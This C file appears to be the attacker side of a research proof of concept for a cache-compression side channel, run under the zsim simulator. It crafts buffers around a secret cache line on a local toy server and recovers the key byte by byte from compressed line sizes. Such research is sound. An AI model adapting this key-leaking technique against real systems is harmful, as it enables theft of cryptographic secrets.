#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdio.h>
#include <unistd.h>
#include "interface.h"
#include "../common/cache_manipulation.h"

#include "../common/zsim_hooks.h"
#include "../fpc_exploit/steal_bytes.h"

#define LINESIZE 64

long KEYSET;
int KEYSIZE;

int data_socket;

unsigned cache_line_size();
void send_buffer(char *to_send, int keysize);
void my_send_buffer(char *to_send, int keysize, int position);
unsigned observe_modifications();
void accessKey();
void ciph();

void dummyAccess(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = DUMMY_ACCESS;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

void connect_socket(int *sock, char *socket_name) {
  int ret;
  struct sockaddr_un addr;

  /* Create local socket. */

  *sock = socket(AF_UNIX, SOCK_SEQPACKET, 0);
  if (*sock == -1) {
    perror("sock");
    exit(EXIT_FAILURE);
  }

  /*
   * For portability clear the whole structure, since some
   * implementations have additional (nonstandard) fields in
   * the structure.
   */
  memset(&addr, 0, sizeof(struct sockaddr_un));

  /* Connect socket to socket address */

  addr.sun_family = AF_UNIX;
  strncpy(addr.sun_path, socket_name, sizeof(addr.sun_path) - 1);

  zsim_roi_begin();

  ret = connect (*sock, (const struct sockaddr *) &addr,
		 sizeof(struct sockaddr_un));
  if (ret == -1) {
    fprintf(stderr, "[A] The server is down.\n");
    exit(EXIT_FAILURE);
  }
}

void flush(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = FLUSH;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

void get_key_set(){ // Asking directly the server for it
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = GET_SET;
  int _r = write(data_socket, buffer, BUFFERSIZE);

  _r = read(data_socket, buffer, BUFFERSIZE);
  long *keyset = (long *) &buffer;
  KEYSET = *keyset;
  
  printf("[A] Set where the key is: %ld\n", KEYSET);
}

int main(int argc, char *argv[]){
  KEYSIZE = argc > 1 ? atoi(argv[1]) : 4;
  if (KEYSIZE == 0) exit(0);
  connect_socket(&data_socket, SOCKET_NAME);
  get_key_set();

  // Set initial values around the key, then guess it by BDI exploit
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  // Use a pseudorandom input array to make line not compressible
  for (int i = 0; i < BUFFERSIZE; i++) { buffer[i] = i*41+51%256; }
  void access(){send_buffer(buffer,KEYSIZE);};
  printf("[A] Compressed_size of the line: %u\n", observe_modifications(&access));
  
  unsigned char answer[KEYSIZE];
  bzero(answer, KEYSIZE);
  // Call to the process to get the secret
  steal_incremental(buffer, answer, &observe_modifications, &my_send_buffer, KEYSIZE);
  
  printf("[A] Secret value is: ");
  for(int i = 0; i < KEYSIZE; i++) printf("%u,", answer[i]);
  printf("\n");

  bzero(buffer, BUFFERSIZE);
  buffer[0] = KILL;
  int _r = write(data_socket, buffer, BUFFERSIZE);

  close(data_socket);

  zsim_heartbeat();

  exit(EXIT_SUCCESS);
}


/* Get size of the cache line where the key is. */
unsigned cache_line_size(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = GET_EVICTED_LINES;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // (right now we is given by the main program)
  _r = read(data_socket, buffer, BUFFERSIZE);
  unsigned *size = (unsigned *) &buffer;
  return *size;
}

void send_buffer(char *to_send, int keysize){
	unsigned char buffer[BUFFERSIZE];

	memset(buffer, 1, BUFFERSIZE);
	buffer[0] = CIPHER;

	// Knowing that there are 2 lines of separation between attacker space and secret cache line
	//
	// And that is because of the encrypt function on the server.c file!
  
	// Write before the secret...
	memcpy(&buffer[129], to_send, LINESIZE-keysize);

	bzero(&buffer[LINESIZE*3+1-keysize], 8); // Point to stop
	
	int _r = write(data_socket, buffer, BUFFERSIZE);
}

void my_send_buffer(char *to_send, int keysize, int position){
  unsigned char buffer[BUFFERSIZE];

  memset(buffer, 1, BUFFERSIZE);
  buffer[0] = CIPHER;

  // Knowing that there are 2 lines of separation between attacker space and secret cache line
  //
  // And that is because of the encrypt function on the server.c file!
  
  // Write before the secret...
  memcpy(&buffer[129], to_send, LINESIZE-keysize+position);
  // ...and after the secret.
  memcpy(&buffer[129+LINESIZE-keysize+position+1 /*not sure about +1*/], to_send, keysize-position);

  bzero(&buffer[LINESIZE*3+1-keysize], 8); // Point to stop
  // I think no need to change, it is 3 cache lines down.

  int _r = write(data_socket, buffer, BUFFERSIZE);
}

void accessKey(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = ACCESS_KEY;
  int _r = write(data_socket, buffer, BUFFERSIZE);
  // Wait response
  _r = read(data_socket, buffer, BUFFERSIZE);
}

void ciph(){
  unsigned char buffer[BUFFERSIZE];
  bzero(buffer, BUFFERSIZE);
  buffer[0] = CIPHER;
  int _r = write(data_socket, buffer, BUFFERSIZE);
}

void relax(){}

unsigned observe_modifications(void (*access)()){
  access();
  printf("[A] Calling get_size()\n");
  return fpc_bruteforce_get_size(KEYSET, access, &flush);
}
